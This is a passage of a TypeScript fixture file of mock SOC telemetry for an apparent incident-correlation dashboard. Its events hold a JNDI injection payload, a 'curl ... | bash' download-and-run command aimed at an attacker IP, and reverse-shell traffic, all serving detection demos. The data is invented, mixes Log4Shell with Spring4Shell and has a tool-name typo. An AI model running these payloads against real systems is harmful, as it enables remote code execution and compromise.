/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 * 
 * SENTINEL FUSION - High-Fidelity Multi-Source Telemetry Datasets
 * Real-world calibrated scenarios with cross-tool correlations
 */

import { Incident, NormalizedEvent, PacketFrame, PlaybookResponseAction, TelemetryCoverageSegment, UnifiedAsset } from '../types/security';
import { syncPseudoSha256 } from './evidence';

// --- Assets ---
export const MOCK_ASSETS: UnifiedAsset[] = [
  {
    id: 'ASSET-CORP-DB01',
    ip: '10.0.4.15',
    mac: '00:50:56:b3:41:9a',
    hostname: 'Corp-DB01.fin.corp',
    os: 'Ubuntu Linux 22.04 LTS (Kernel 5.15.0)',
    segment: 'INTERNAL_CORE',
    criticality: 'TIER_1_CRITICAL',
    services: [
      { port: 22, protocol: 'tcp', service: 'ssh', version: 'OpenSSH 8.9p1', baselineStatus: 'AUTHORIZED', firstSeen: '2026-01-10T00:00:00Z', lastScanned: '2026-10-13T08:00:00Z' },
      { port: 5432, protocol: 'tcp', service: 'postgresql', version: 'PostgreSQL 15.3', baselineStatus: 'AUTHORIZED', firstSeen: '2026-01-10T00:00:00Z', lastScanned: '2026-10-13T08:00:00Z' },
      { port: 8443, protocol: 'tcp', service: 'https-alt', version: 'Apache Tomcat / Spring Core 5.3.17', baselineStatus: 'UNEXPECTED_NEW', firstSeen: '2026-10-13T08:12:00Z', lastScanned: '2026-10-13T08:12:00Z' },
    ],
    sensorHealth: {
      nmapScanned: true,
      suricataCovered: true,
      zeekMonitored: true,
      wazuhAgentActive: true,
      pcapCaptureEnabled: true,
    },
    lastSeen: '2026-10-13T08:34:00Z',
    tags: ['Database', 'PCI-DSS', 'Production-Core', 'Spring-App']
  },
  {
    id: 'ASSET-WS-HR03',
    ip: '192.168.10.42',
    mac: 'f8:75:a4:2e:11:80',
    hostname: 'Workstation-HR03.ad.corp',
    os: 'Microsoft Windows 11 Enterprise (Build 22631)',
    segment: 'USER_LAN',
    criticality: 'TIER_3_MEDIUM',
    services: [
      { port: 135, protocol: 'tcp', service: 'msrpc', version: 'Microsoft Windows RPC', baselineStatus: 'AUTHORIZED', firstSeen: '2026-02-01T00:00:00Z', lastScanned: '2026-10-13T07:45:00Z' },
      { port: 445, protocol: 'tcp', service: 'microsoft-ds', version: 'SMBv2/v3', baselineStatus: 'AUTHORIZED', firstSeen: '2026-02-01T00:00:00Z', lastScanned: '2026-10-13T07:45:00Z' },
      { port: 3389, protocol: 'tcp', service: 'ms-wbt-server', version: 'Microsoft Terminal Services', baselineStatus: 'UNEXPECTED_NEW', firstSeen: '2026-10-13T06:10:00Z', lastScanned: '2026-10-13T07:45:00Z' },
    ],
    sensorHealth: {
      nmapScanned: true,
      suricataCovered: true,
      zeekMonitored: false,
      wazuhAgentActive: true,
      pcapCaptureEnabled: false,
    },
    lastSeen: '2026-10-13T08:30:00Z',
    tags: ['Workstation', 'HR-Department', 'Active-Directory']
  },
  {
    id: 'ASSET-DMZ-PROXY01',
    ip: '172.16.0.5',
    mac: '00:1c:42:ff:88:21',
    hostname: 'DMZ-ReverseProxy.edge.corp',
    os: 'Alpine Linux 3.19',
    segment: 'DMZ',
    criticality: 'TIER_2_HIGH',
    services: [
      { port: 80, protocol: 'tcp', service: 'http', version: 'nginx 1.25.4', baselineStatus: 'AUTHORIZED', firstSeen: '2026-01-01T00:00:00Z', lastScanned: '2026-10-13T08:15:00Z' },
      { port: 443, protocol: 'tcp', service: 'ssl/https', version: 'nginx 1.25.4', baselineStatus: 'AUTHORIZED', firstSeen: '2026-01-01T00:00:00Z', lastScanned: '2026-10-13T08:15:00Z' }
    ],
    sensorHealth: {
      nmapScanned: true,
      suricataCovered: true,
      zeekMonitored: true,
      wazuhAgentActive: true,
      pcapCaptureEnabled: true,
    },
    lastSeen: '2026-10-13T08:33:00Z',
    tags: ['Edge', 'Reverse-Proxy', 'TLS-Termination']
  },
  {
    id: 'ASSET-DC01',
    ip: '10.0.1.5',
    mac: '00:50:56:a1:04:77',
    hostname: 'DC01-Primary.ad.corp',
    os: 'Windows Server 2022 Datacenter',
    segment: 'INTERNAL_CORE',
    criticality: 'TIER_1_CRITICAL',
    services: [
      { port: 53, protocol: 'udp', service: 'dns', version: 'Microsoft DNS', baselineStatus: 'AUTHORIZED', firstSeen: '2026-01-01T00:00:00Z', lastScanned: '2026-10-13T08:00:00Z' },
      { port: 88, protocol: 'tcp', service: 'kerberos-sec', version: 'Microsoft Kerberos', baselineStatus: 'AUTHORIZED', firstSeen: '2026-01-01T00:00:00Z', lastScanned: '2026-10-13T08:00:00Z' },
      { port: 389, protocol: 'tcp', service: 'ldap', version: 'Microsoft Active Directory LDAP', baselineStatus: 'AUTHORIZED', firstSeen: '2026-01-01T00:00:00Z', lastScanned: '2026-10-13T08:00:00Z' },
      { port: 445, protocol: 'tcp', service: 'microsoft-ds', version: 'SMBv2/v3', baselineStatus: 'AUTHORIZED', firstSeen: '2026-01-01T00:00:00Z', lastScanned: '2026-10-13T08:00:00Z' }
    ],
    sensorHealth: {
      nmapScanned: true,
      suricataCovered: true,
      zeekMonitored: true,
      wazuhAgentActive: true,
      pcapCaptureEnabled: true,
    },
    lastSeen: '2026-10-13T08:34:00Z',
    tags: ['Domain-Controller', 'Identity-Core', 'Tier-0']
  }
];

// --- Packets for Scenario 1 ---
export const MOCK_PCAP_FRAMES_S1: PacketFrame[] = [
  {
    frameNumber: 1421,
    timestamp: '2026-10-13T08:14:02.108Z',
    srcIp: '194.26.29.112',
    destIp: '10.0.4.15',
    srcPort: 48912,
    destPort: 8443,
    protocol: 'TCP',
    length: 66,
    info: '48912 → 8443 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1',
    tcpFlags: '[SYN]',
    hexPayload: '00 50 56 b3 41 9a 00 1c 42 ff 88 21 08 00 45 00 00 3c bf 12 40 00 35 06 c2 e1 c2 1a 1d 70 0a 00 04 0f bf 10 20 fb 3a df e4 00 00 00 00 00 a0 02 fa f0 a4 dc 00 00 02 04 05 b4 04 02 08 0a',
    asciiPayload: '.PV.A...B...E..<..@.5....p...... ..:.................'
  },
  {
    frameNumber: 1422,
    timestamp: '2026-10-13T08:14:02.109Z',
    srcIp: '10.0.4.15',
    destIp: '194.26.29.112',
    srcPort: 8443,
    destPort: 48912,
    protocol: 'TCP',
    length: 66,
    info: '8443 → 48912 [SYN, ACK] Seq=0 Ack=1 Win=65160 Len=0',
    tcpFlags: '[SYN, ACK]',
    hexPayload: '00 1c 42 ff 88 21 00 50 56 b3 41 9a 08 00 45 00 00 3c 00 00 40 00 40 06 b8 f3 0a 00 04 0f c2 1a 1d 70 20 fb bf 10 88 3f 12 01 3a df e4 01 a0 12 fe 88 8b 1e 00 00 02 04 05 b4 04 02 08 0a',
    asciiPayload: '..B..!PV.A...E..<..@.@........p ..?...:................'
  },
  {
    frameNumber: 1425,
    timestamp: '2026-10-13T08:14:02.185Z',
    srcIp: '194.26.29.112',
    destIp: '10.0.4.15',
    srcPort: 48912,
    destPort: 8443,
    protocol: 'HTTP',
    length: 482,
    info: 'POST /api/v1/auth/login HTTP/1.1 (application/x-www-form-urlencoded)',
    tcpFlags: '[PSH, ACK]',
    hexPayload: '50 4f 53 54 20 2f 61 70 69 2f 76 31 2f 61 75 74 68 2f 6c 6f 67 69 6e 20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a 20 63 6f 72 70 2d 64 62 30 31 2e 66 69 6e 2e 63 6f 72 70 3a 38 34 34 33 0d 0a 55 73 65 72 2d 41 67 65 6e 74 3a 20 24 7b 6a 6e 64 69 3a 6c 64 61 70 3a 2f 2f 31 39 34 2e 32 36 2e 32 39 2e 31 31 32 3a 31 33 38 39 2f 45 78 70 6c 6f 69 74 7d 0d 0a 43 6f 6e 74 65 6e 74 2d 54 79 70 65 3a 20 61 70 70 6c 69 63 61 74 69 6f 6e 2f 78 2d 77 77 77 2d 66 6f 72 6d 2d 75 72 6c 65 6e 63 6f 64 65 64 0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67 74 68 3a 20 33 34 0d 0a 0d 0a 75 73 65 72 6e 61 6d 65 3d 61 64 6d 69 6e 26 74 6f 6b 65 6e 3d 74 65 73 74',
    asciiPayload: 'POST /api/v1/auth/login HTTP/1.1\r\nHost: corp-db01.fin.corp:8443\r\nUser-Agent: ${jndi:ldap://194.26.29.112:1389/Exploit}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 34\r\n\r\nusername=admin&token=test',
    suspiciousOffsets: [
      {
        start: 74,
        end: 119,
        label: '${jndi:ldap://194.26.29.112:1389/Exploit}',
        threatClass: 'Log4Shell / Spring4Shell JNDI Remote Injection'
      }
    ]
  },
  {
    frameNumber: 1428,
    timestamp: '2026-10-13T08:14:02.912Z',
    srcIp: '10.0.4.15',
    destIp: '194.26.29.112',
    srcPort: 52188,
    destPort: 1389,
    protocol: 'LDAP',
    length: 124,
    info: 'LDAP bindRequest(1) "cn=Directory Manager" simple',
    tcpFlags: '[PSH, ACK]',
    hexPayload: '30 64 02 01 01 60 5f 02 01 03 04 14 63 6e 3d 44 69 72 65 63 74 6f 72 79 20 4d 61 6e 61 67 65 72 80 44 6a 61 76 61 43 6c 61 73 73 4e 61 6d 65 3d 45 78 70 6c 6f 69 74 20 6a 61 76 61 43 6f 64 65 42 61 73 65 3d 68 74 74 70 3a 2f 2f 31 39 34 2e 32 36 2e 32 39 2e 31 31 32 2f',
    asciiPayload: '0d...`_.....cn=Directory Manager.DjavaClassName=Exploit javaCodeBase=http://194.26.29.112/',
    suspiciousOffsets: [
      {
        start: 37,
        end: 90,
        label: 'javaClassName=Exploit javaCodeBase=http://194.26.29.112/',
        threatClass: 'RCE Serialized Class Loading via External LDAP'
      }
    ]
  },
  {
    frameNumber: 1435,
    timestamp: '2026-10-13T08:14:04.421Z',
    srcIp: '10.0.4.15',
    destIp: '194.26.29.112',
    srcPort: 53990,
    destPort: 4444,
    protocol: 'TCP',
    length: 158,
    info: '53990 → 4444 [PSH, ACK] Encrypted Reverse Shell Beacon Stream',
    tcpFlags: '[PSH, ACK]',
    hexPayload: '1b 5b 30 31 3b 33 32 6d 77 77 77 2d 64 61 74 61 40 43 6f 72 70 2d 44 42 30 31 1b 5b 30 30 6d 3a 1b 5b 30 31 3b 33 34 6d 2f 76 61 72 2f 77 77 77 1b 5b 30 30 6d 24 20 75 6e 61 6d 65 20 2d 61 0a 4c 69 6e 75 78 20 43 6f 72 70 2d 44 42 30 31 20 35 2e 31 35 2e 30 2d 38 38 2d 67 65 6e 65 72 69 63',
    asciiPayload: '.[01;32mwww-data@Corp-DB01.[00m:.[01;34m/var/www.[00m$ uname -a\nLinux Corp-DB01 5.15.0-88-generic',
    suspiciousOffsets: [
      {
        start: 0,
        end: 80,
        label: 'www-data@Corp-DB01$ uname -a',
        threatClass: 'Interactive Reverse Shell Spawned'
      }
    ]
  }
];

// --- Normalized Events for Scenario 1: Operation PhantomBeacon ---
export const MOCK_EVENTS_S1: NormalizedEvent[] = [
  {
    id: 'EV-NMAP-001',
    timestamp: '2026-10-13T08:12:15.000Z',
    sourceTool: 'NMAP',
    category: 'DISCOVERY',
    destIp: '10.0.4.15',
    destPort: 8443,
    protocol: 'TCP',
    hostname: 'Corp-DB01.fin.corp',
    severity: 'HIGH',
    title: 'Unexpected Service Port Exposed: 8443/TCP (Apache Tomcat / Spring Core)',
    description: 'Scheduled authorized asset audit detected port 8443 newly opened on internal critical database server. Baseline comparison shows port was NOT authorized in security architecture policy.',
    rawEvent: '<port protocol="tcp" portid="8443"><state state="open" reason="syn-ack"/><service name="https-alt" product="Apache Tomcat" version="Spring Core 5.3.17" method="probed"/></port>',
    evidenceHash: syncPseudoSha256('nmap_port_8443_corp_db01_unauthorized'),
    mitreTechniques: ['T1046'],
    attributes: {
      port: 8443,
      service: 'https-alt',
      version: 'Spring Core 5.3.17',
      baselineDiff: 'UNEXPECTED_NEW',
      scannedBy: 'internal-sec-scanner.corp'
    }
  },
  {
    id: 'EV-SURI-002',
    timestamp: '2026-10-13T08:14:02.185Z',
    sourceTool: 'SURICATA',
    category: 'NETWORK_ALERT',
    sourceIp: '194.26.29.112',
    destIp: '10.0.4.15',
    sourcePort: 48912,
    destPort: 8443,
    protocol: 'TCP',
    severity: 'CRITICAL',
    title: 'Suricata Alert: ET EXPLOIT Apache Log4j / Spring4Shell JNDI Injection Attempt',
    description: 'Suricata NIDS detected malicious exploit pattern matching SID: 2034334. Ingress HTTP POST request contains JNDI remote class loading string in User-Agent header directed at newly exposed service.',
    rawEvent: '{"timestamp":"2026-10-13T08:14:02.185Z","flow_id":918237192837,"event_type":"alert","src_ip":"194.26.29.112","src_port":48912,"dest_ip":"10.0.4.15","dest_port":8443,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2034334,"rev":2,"signature":"ET EXPLOIT Apache Log4j/Spring4Shell JNDI Injection Ingress","category":"Attempted Administrator Privilege Gain","severity":1}}',
    evidenceHash: syncPseudoSha256('suricata_alert_2034334_log4j_spring'),
    mitreTechniques: ['T1190'],
    attributes: {
      sid: 2034334,
      category: 'Attempted Administrator Privilege Gain',
      targetPort: 8443,
      attackerIp: '194.26.29.112'
    }
  },
  {
    id: 'EV-PCAP-003',
    timestamp: '2026-10-13T08:14:02.912Z',
    sourceTool: 'WIRESHARK_TSHARK',
    category: 'FLOW',
    sourceIp: '10.0.4.15',
    destIp: '194.26.29.112',
    sourcePort: 52188,
    destPort: 1389,
    protocol: 'LDAP',
    severity: 'CRITICAL',
    title: 'TShark Deep Packet Analysis: Outbound LDAP Callback & Serialized Object Request',
    description: 'Frame #1428 capture shows server 10.0.4.15 initiating outbound LDAP query to attacker IP 194.26.29.112:1389 requesting Exploit.class. Corroborates successful triggering of JNDI injection.',
    rawEvent: 'Frame 1428: 124 bytes on wire. Protocol LDAP. MsgID=1 bindRequest(1) dn: cn=Directory Manager, javaClassName=Exploit javaCodeBase=http://194.26.29.112/',
    evidenceHash: syncPseudoSha256('tshark_frame_1428_ldap_jndi_callback'),
    mitreTechniques: ['T1190', 'T1071'],
    attributes: {
      frameNumber: 1428,
      streamIndex: 42,
      extractedUrl: 'http://194.26.29.112/Exploit.class',
      hexOffset: '0x0025'
    }
  },
  {
    id: 'EV-ZEEK-004',
    timestamp: '2026-10-13T08:14:03.110Z',
    sourceTool: 'ZEEK',
    category: 'FLOW',
    sourceIp: '10.0.4.15',
    destIp: '194.26.29.112',
    sourcePort: 52190,
    destPort: 80,
    protocol: 'HTTP',
    severity: 'HIGH',
    title: 'Zeek HTTP Log: Outbound Payload Download (Exploit.class)',
    description: 'Zeek protocol analyzer recorded outbound HTTP GET request from Corp-DB01 fetching binary executable payload "Exploit.class" (HTTP 200, 14,280 bytes transferred).',
    rawEvent: '{"ts":1791888843.110,"uid":"C9k2A81kF92","id.orig_h":"10.0.4.15","id.orig_p":52190,"id.resp_h":"194.26.29.112","id.resp_p":80,"method":"GET","uri":"/Exploit.class","status_code":200,"response_body_len":14280}',
    evidenceHash: syncPseudoSha256('zeek_http_exploit_class_download'),
    mitreTechniques: ['T1105'],
    attributes: {
      uid: 'C9k2A81kF92',
      uri: '/Exploit.class',
      downloadBytes: 14280,
      mimeType: 'application/octet-stream'
    }
  },
  {
    id: 'EV-WAZUH-005',
    timestamp: '2026-10-13T08:14:04.120Z',
    sourceTool: 'WAZUH',
    category: 'ENDPOINT_PROCESS',
    destIp: '10.0.4.15',
    hostname: 'Corp-DB01.fin.corp',
    severity: 'CRITICAL',
    title: 'Wazuh EDR Alert: Suspicious Child Process Spawned by Java Runtime',
    description: 'Wazuh Rule 100201 (Level 14 - Critical): Java service process (PID 4821) spawned "/bin/sh -c curl -s http://194.26.29.112/payload.sh | bash". Confirms remote code execution on the endpoint.',
    rawEvent: '{"timestamp":"2026-10-13T08:14:04.120Z","rule":{"level":14,"id":100201,"description":"Java process spawned shell command execution","mitre":{"id":["T1059.004","T1190"]}},"agent":{"id":"004","name":"Corp-DB01","ip":"10.0.4.15"},"data":{"parent_process":"/usr/lib/jvm/java-17-openjdk-amd64/bin/java","parent_pid":4821,"process":"/bin/sh","cmdline":"/bin/sh -c curl -s http://194.26.29.112/payload.sh | bash"}}',
    evidenceHash: syncPseudoSha256('wazuh_rule_100201_java_shell_spawn'),
    mitreTechniques: ['T1059.004', 'T1059'],
    attributes: {
      ruleId: 100201,
      ruleLevel: 14,
      parentPid: 4821,
      childPid: 5104,
      cmdline: '/bin/sh -c curl -s http://194.26.29.112/payload.sh | bash',
      user: 'www-data'
    }
  },
  {
    id: 'EV-PCAP-006',
    timestamp: '2026-10-13T08:14:04.421Z',
    sourceTool: 'WIREXHARK_TSHARK' as any,
    category: 'FLOW',
    sourceIp: '10.0.4.15',
    destIp: '194.26.29.112',
    sourcePort: 53990,
    destPort: 4444,
    protocol: 'TCP',
    severity: 'CRITICAL',
    title: 'TShark Analysis: Interactive Reverse Shell Established on Port 4444',
    description: 'Frame #1435: Persistent TCP stream established between 10.0.4.15 and 194.26.29.112:4444. Transmitted data contains interactive shell prompt "www-data@Corp-DB01$ uname -a".',
    rawEvent: 'Frame 1435: 158 bytes. Protocol TCP. Interactive prompt: www-data@Corp-DB01$ uname -a. Stream ID 44.',
    evidenceHash: syncPseudoSha256('tshark_frame_1435_reverse_shell_stream'),
    mitreTechniques: ['T1071', 'T1059'],
    attributes: {
      streamIndex: 44,
      c2Port: 4444,
      interactiveSession: true
    }
  },
  {
    id: 'EV-MISP-007',
    timestamp: '2026-10-13T08:14:05.000Z',
    sourceTool: 'MISP',
    category: 'THREAT_INTEL',
    sourceIp: '194.26.29.112',
    severity: 'HIGH',
    title: 'MISP Threat Intel Hit: 194.26.29.112 Associated with Threat Group APT-29 / CozyBear',
    description: 'Threat Intelligence correlation matched IP 194.26.29.112 against MISP Event #8491 ("APT-29 Dynamic Exploitation Infrastructure - Q4 2026"). Confidence: 94%. Sightings in 12 global threat feeds.',
    rawEvent: '{"misp_event_id":8491,"attribute":"194.26.29.112","type":"ip-dst","threat_actor":"APT-29","confidence":94,"category":"Network activity","tags":["tlp:amber","apt:cozybear","malware:cobaltstrike"]}',
    evidenceHash: syncPseudoSha256('misp_ioc_hit_194_26_29_112_apt29'),
    mitreTechniques: ['T1071'],
    attributes: {
      threatActor: 'APT-29 (CozyBear)',
      mispEventId: 8491,
      confidence: 94,
      tlp: 'AMBER'
    }
  }
];

// --- Incident for Scenario 1 ---
export const MOCK_INCIDENT_S1: Incident = {
  id: 'INC-2026-8941',
  title: 'Operation PhantomBeacon: Unauthorized Port Exposure & Remote Exploitation Leading to Reverse Shell',
  summary: 'Multi-stage confirmed compromise on Corp-DB01. An unexpected service port (8443) was flagged by Nmap discovery; 108 seconds later, Suricata detected an ingress JNDI RCE exploit from 194.26.29.112. Wireshark/TShark extracted the outbound LDAP/HTTP payload fetch, and Wazuh EDR captured Java spawning an active reverse shell. Correlated threat intel confirms 194.26.29.112 as active C2 infrastructure.',
  severity: 'CRITICAL',
  confidenceScore: 98,
  confidenceBreakdown: {
    networkDiscoveryCorroboration: 25,
    idsPayloadDetection: 30,
    packetForensicsVerification: 20,
    endpointExecutionConfirmation: 15,
    threatIntelReputationMatch: 8
  },
  status: 'OPEN_INVESTIGATION',
  affectedAssets: [MOCK_ASSETS[0]],
  attackerIps: ['194.26.29.112'],
  primaryAttackVector: 'Remote Code Execution (CVE-2021-44228 / CVE-2022-22965 via Port 8443)',
  firstObservedAt: '2026-10-13T08:12:15.000Z',
  lastObservedAt: '2026-10-13T08:14:05.000Z',
  events: MOCK_EVENTS_S1,
  mitreMatrix: [
    {
      tactic: 'Reconnaissance / Discovery',
      id: 'T1046',
      name: 'Network Service Discovery',
      eventIds: ['EV-NMAP-001'],
      confidence: 98
    },
    {
      tactic: 'Initial Access',
      id: 'T1190',
      name: 'Exploit Public-Facing Application',
      eventIds: ['EV-SURI-002', 'EV-PCAP-003'],
      confidence: 99
    },
    {
      tactic: 'Execution',
      id: 'T1059.004',
      name: 'Command and Scripting Interpreter: Unix Shell',
      eventIds: ['EV-WAZUH-005'],
      confidence: 100
    },
    {
      tactic: 'Command and Control',
      id: 'T1071',
      name: 'Application Layer Protocol: Reverse Shell / LDAP',
      eventIds: ['EV-PCAP-006', 'EV-MISP-007'],
      confidence: 95
    },
    {
      tactic: 'Lateral Tool Transfer',
      id: 'T1105',
      name: 'Ingress Tool Transfer (curl payload)',
      eventIds: ['EV-ZEEK-004'],
      confidence: 96
    }
  ],
  hypotheses: [
    {
      id: 'HYP-A',
      title: 'Hypothesis A: Active Nation-State / Cybercrime C2 Breach (Primary)',
      likelihood: 'HIGH',
      confidencePercentage: 94,
      rationale: 'Observed sequence represents a textbook kill chain: unbaseline port exposure -> weaponized JNDI exploit -> endpoint child shell -> external C2 beacon to known APT-29 threat indicator. All 5 tools corroborate without contradictions.',
      supportingEvidenceIds: ['EV-NMAP-001', 'EV-SURI-002', 'EV-PCAP-003', 'EV-WAZUH-005', 'EV-PCAP-006', 'EV-MISP-007'],
      refutingEvidenceIds: []
    },
    {
      id: 'HYP-B',
      title: 'Hypothesis B: Scheduled Internal Red Team / Penetration Test',
      likelihood: 'LOW',
      confidencePercentage: 6,
      rationale: 'Could theoretically be an authorized penetration test, but SOC Change Advisory Board (CAB) records show NO active penetration test authorized for 10.0.4.15 today, and the source IP (194.26.29.112) is NOT in the authorized pentester scope list.',
      supportingEvidenceIds: ['EV-NMAP-001'],
      refutingEvidenceIds: ['EV-MISP-007', 'EV-PCAP-006']
    }
  ],
  recommendations: [
    {
      id: 'REC-001',
      title: 'Isolate Host Corp-DB01 from Internal Core Network (Wazuh Active Response)',
      priority: 'IMMEDIATE',
      reason: 'Prevent lateral movement into neighboring production PostgreSQL database clusters and Domain Controllers.',
      requiredTool: 'WAZUH',
      suggestedCommand: '/var/ossec/bin/agent_control -b 10.0.4.15 -u 004'
    },
    {
      id: 'REC-002',
      title: 'Block Attacker IP 194.26.29.112 at Perimeter Edge Firewall',
      priority: 'IMMEDIATE',
      reason: 'Sever active C2 reverse shell channel on TCP port 4444 and prevent further payload downloads.',
      requiredTool: 'SURICATA',
      suggestedCommand: 'iptables -I FORWARD -s 194.26.29.112 -j DROP'
    },
    {
      id: 'REC-003',
      title: 'Trigger Full Packet Capture Ring-Buffer Dump for Flow 48912 & 53990',
      priority: 'HIGH',
      reason: 'Preserve complete forensic packet capture before network buffers rotate for regulatory evidence preservation.',
      requiredTool: 'WIRESHARK_TSHARK',
      suggestedCommand: 'tshark -r /var/log/pcap/live.pcap -Y "ip.addr == 194.26.29.112" -w /evidence/INC-2026-8941_stream.pcap'
    },
    {
      id: 'REC-004',
      title: 'Kill Child Shell Process Tree (PID 5104) and Audit In-Memory Java Threads',
      priority: 'HIGH',
      reason: 'Terminate running shell process while maintaining system memory snapshot for volatility forensics.',
      requiredTool: 'OSQUERY',
      suggestedCommand: 'osqueryi "SELECT * FROM processes WHERE parent = 4821;"'
    }
  ]
};

// --- Controlled Response Actions ---
export const MOCK_RESPONSE_ACTIONS_S1: PlaybookResponseAction[] = [
  {
    id: 'ACT-001',
    incidentId: 'INC-2026-8941',
    title: 'Isolate Host Corp-DB01 Network Interface (Wazuh Active Response)',
    tool: 'WAZUH',
    target: 'Corp-DB01 (10.0.4.15, Agent 004)',
    actionType: 'ISOLATE_HOST',
    riskLevel: 'HIGH_DISRUPTION',
    requiresApproval: true,
    status: 'PENDING_APPROVAL',
    approverRole: 'Lead SOC Incident Commander',
    safeguards: [
      'Preserves active Wazuh management communication port (1514/1515)',
      'Failsafe timer: automatic release in 120 minutes if not confirmed',
      'Database transactional buffer flush initiated before interface drop'
    ],
    rollbackCommand: '/var/ossec/active-response/bin/host-deny.sh delete - 10.0.4.15',
    simulationOutput: '[DRY-RUN SIMULATION] Would execute host isolation script on agent 004. Ingress/egress TCP/UDP traffic halted except OSSEC control socket. 0 production transactions currently buffered.'
  },
  {
    id: 'ACT-002',
    incidentId: 'INC-2026-8941',
    title: 'Block Attacker IP 194.26.29.112 Across All Edge Firewalls',
    tool: 'PERIMETER_FIREWALL',
    target: '194.26.29.112',
    actionType: 'BLOCK_IP',
    riskLevel: 'LOW',
    requiresApproval: true,
    status: 'APPROVED',
    approverRole: 'Tier 2 SOC Analyst',
    approverName: 'Alex Mercer (SOC-L2)',
    approvedAt: '2026-10-13T08:20:00Z',
    safeguards: [
      'Verified 194.26.29.112 is external routable IP',
      'Not part of corporate CDN, DNS root, or Cloudflare ranges',
      'Automatic sync to Palo Alto Panorama & Suricata dynamic blocklists'
    ],
    rollbackCommand: 'panorama-cli security-policy delete --rule "BLOCK_INC_8941"',
    simulationOutput: '[DRY-RUN SIMULATION] 1 rule will be pushed to 4 perimeter gateways. Estimated latency impact: 0ms. Active TCP stream 53990 will receive TCP RST.'
  },
  {
    id: 'ACT-003',
    incidentId: 'INC-2026-8941',
    title: 'Snapshot Volatile Process Memory & Kill PID 5104',
    tool: 'WAZUH',
    target: 'PID 5104 (/bin/sh spawned by Java)',
    actionType: 'KILL_PROCESS',
    riskLevel: 'MODERATE',
    requiresApproval: true,
    status: 'PENDING_APPROVAL',
    approverRole: 'Tier 3 DFIR Specialist',
    safeguards: [
      'Triggers /proc/5104 memory dump to secure vault before SIGKILL',
      'Does NOT kill parent Java thread 4821 (prevents database engine crash)',
      'Audit log recorded to immutable forensic ledger'
    ],
    rollbackCommand: 'systemctl reload tomcat9',
    simulationOutput: '[DRY-RUN SIMULATION] Process tree inspected. Child PID 5104 has 1 active socket on 4444. SIGKILL will terminate shell without interrupting parent DB service.'
  },
  {
    id: 'ACT-004',
    incidentId: 'INC-2026-8941',
    title: 'Dump PCAP Ring-Buffer for Past 60 Minutes (TShark / Arkime)',
    tool: 'WIRESHARK_TSHARK',
    target: 'Flow 10.0.4.15 <-> 194.26.29.112',
    actionType: 'DUMP_PCAP',
    riskLevel: 'LOW',
    requiresApproval: false,
    status: 'EXECUTED',
    approverRole: 'Automated Playbook (No Disruption)',
    approverName: 'Sentinel SOAR Engine',
    approvedAt: '2026-10-13T08:15:30Z',
    safeguards: ['Non-disruptive read-only forensic extraction'],
    rollbackCommand: 'rm /evidence/INC-2026-8941_stream.pcap',
    simulationOutput: '[COMPLETED] Extracted 42.8 MB PCAP from ring-buffer. SHA-256: 7f8a3c... verified in evidence ledger.'
  }
];

// --- Telemetry Coverage & Visibility Auditor Matrix ---
export const MOCK_COVERAGE_SEGMENTS: TelemetryCoverageSegment[] = [
  {
    segmentName: 'DMZ Public Web & Proxies',
    cidr: '172.16.0.0/24',
    totalHosts: 14,
    nmapCoverage: 100,
    suricataCoverage: 100,
    zeekCoverage: 100,
    wazuhCoverage: 92,
    pcapCoverage: 100,
    blindSpotAssessment: 'High visibility. Continuous Suricata inline monitoring and automated daily Nmap diff audits.',
    gapSeverity: 'HEALTHY'
  },
  {
    segmentName: 'Internal Production Core (Databases & IAM)',
    cidr: '10.0.4.0/24',
    totalHosts: 28,
    nmapCoverage: 96,
    suricataCoverage: 90,
    zeekCoverage: 85,
    wazuhCoverage: 96,
    pcapCoverage: 75,
    blindSpotAssessment: 'Good coverage, but high risk: unexpected ports (e.g. 8443) require instantaneous notification to avoid delay.',
    gapSeverity: 'PARTIAL_GAP'
  },
  {
    segmentName: 'Corporate User Workstations (HQ LAN)',
    cidr: '192.168.10.0/22',
    totalHosts: 450,
    nmapCoverage: 65,
    suricataCoverage: 70,
    zeekCoverage: 20,
    wazuhCoverage: 82,
    pcapCoverage: 5,
    blindSpotAssessment: 'CRITICAL VISIBILITY GAP: PCAP and Zeek sensors are largely silent on user LAN. Lateral movement via SMB/RDP could occur without full packet capture.',
    gapSeverity: 'CRITICAL_GAP'
  },
  {
    segmentName: 'Cloud Production VPC (AWS / GCP)',
    cidr: '10.200.0.0/16',
    totalHosts: 110,
    nmapCoverage: 90,
    suricataCoverage: 80,
    zeekCoverage: 90,
    wazuhCoverage: 88,
    pcapCoverage: 60,
    blindSpotAssessment: 'VPC Flow logs active; containerized endpoints need Wazuh sidecar agent upgrades on 12 nodes.',
    gapSeverity: 'PARTIAL_GAP'
  }
];

// --- Scenario 2: Ransomware Lateral Movement ---
export const MOCK_EVENTS_S2: NormalizedEvent[] = [
  {
    id: 'EV-NMAP-S2-01',
    timestamp: '2026-10-13T06:10:00Z',
    sourceTool: 'NMAP',
    category: 'DISCOVERY',
    destIp: '192.168.10.42',
    destPort: 3389,
    protocol: 'TCP',
    hostname: 'Workstation-HR03.ad.corp',
    severity: 'MEDIUM',
    title: 'Nmap Discovery: RDP Port 3389 Active on HR Workstation',
    description: 'Nmap scan discovered Microsoft Terminal Services (RDP) opened on workstation subnet.',
    rawEvent: '<port protocol="tcp" portid="3389"><state state="open"/><service name="ms-wbt-server"/></port>',
    evidenceHash: syncPseudoSha256('nmap_rdp_port_3389_hr03'),
    mitreTechniques: ['T1046', 'T1021.001'],
    attributes: { port: 3389, service: 'ms-wbt-server' }
  },
  {
    id: 'EV-SURI-S2-02',
    timestamp: '2026-10-13T07:15:22Z',
    sourceTool: 'SURICATA',
    category: 'NETWORK_ALERT',
    sourceIp: '192.168.10.42',
    destIp: '10.0.1.5',
    destPort: 445,
    protocol: 'TCP',
    severity: 'CRITICAL',
    title: 'Suricata Alert: ET EXPLOIT Microsoft Windows SMB Lateral PsExec Execution',
    description: 'Suricata detected DCE/RPC SVCCTL CreateServiceW remote execution across SMB flow from HR workstation to Domain Controller.',
    rawEvent: '{"alert":{"signature":"ET EXPLOIT PsExec Service Execution over SMB","signature_id":2014881,"severity":1}}',
    evidenceHash: syncPseudoSha256('suricata_psexec_smb_lateral'),
    mitreTechniques: ['T1021.002'],
    attributes: { serviceName: 'PSEXESVC' }
  },
